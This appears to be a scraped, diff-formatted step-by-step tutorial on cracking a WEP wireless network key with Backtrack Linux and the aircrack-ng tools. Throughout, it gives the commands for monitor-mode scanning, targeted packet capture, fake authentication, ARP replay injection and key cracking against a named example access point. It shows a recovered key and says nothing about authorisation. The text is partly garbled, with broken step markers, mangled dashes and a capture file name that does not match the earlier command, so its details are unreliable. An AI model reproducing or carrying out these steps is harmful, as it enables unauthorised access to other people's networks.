@@ -1,0 +1,32 @@
+ Windows cannot sniff WEP packets, but you can use a bootable CD of Linux.;
+, Backtrack is a commonly-used option. Download the iso image and burn it on a bootable CD/DVD.
+ Use your bootable CD/DVDs.
+
+
+Note that this operating system is not required to be installed on hard drive. That means whenever you shutdown the Backtrack, all your data will be lost.
+ The following Backtrack screen will show after booting. Change the option with the up and down arrow keys and select one. This tutorial will use the first option.
+ In this option, Backtrack is started on command base. Type command: startx to continue.
+ It'll be the fifth option.
+, Enter the following command: "airmon-ng" (without quotes). You should see something like wlan0 beneath Interface.
+ Enter the following command: "airodump-ng wlan0" (without quotes). You should get three things:
+
+
+BSSID
+Channel
+ESSID (AP Name)
+Here's what the tutorial case turned up:
+
+BSSID 00:17:3F:76:36:6E
+Channel number 1
+ESSID(AP Name)Suleman
+
+
+
+, This one will use the example information above, but you should plug in your own. Command: "airodump-ng -w wep -c 1 -- bssid 00:17:3F:76:36:6E wlan0" (without quotes).
+, Type the following command, substituting the values for your own BSSID, Channel and ESSID. Command: "aireplay-ng -1 0 –a 00:17:3f:76:36:6E wlan0" (without quotes).
+ Type the following command: "aireplay-ng -3 –b 00:17:3f:76:36:6e wlan0" (without quotes).
+,, It will take 15 to 60 minutes (or more) depending on wireless signal, hardware and load on access point.
+, Type the following command: "dir" (without quotes). This will show the directories saved on it during decrypting.
+ For the example, it would be the following: "aircrack-ng web-02.cap" (without quotes). The setup shown below will start.
+ After this setup completes, you'll be able to break the key. In this example, it was {ADA2D18D2E}.
+
